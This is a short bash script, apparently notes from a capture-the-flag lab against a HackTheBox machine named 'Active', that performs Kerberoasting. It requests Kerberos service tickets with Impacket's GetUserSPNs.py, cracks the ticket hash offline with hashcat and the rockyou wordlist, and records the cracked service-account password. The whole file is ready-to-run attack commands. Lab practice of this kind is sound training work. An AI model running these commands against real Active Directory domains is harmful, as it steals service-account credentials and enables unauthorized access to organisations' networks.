#! /bin/bash

GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out

# This is a ticket to brute force decrypt
cat GetUserSPNs.out 

# -m 13100 tells hashcat the hash type is Kerberos 5 TGS-REP etype23
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force                                       

# cracked password was Ticketmaster1968 
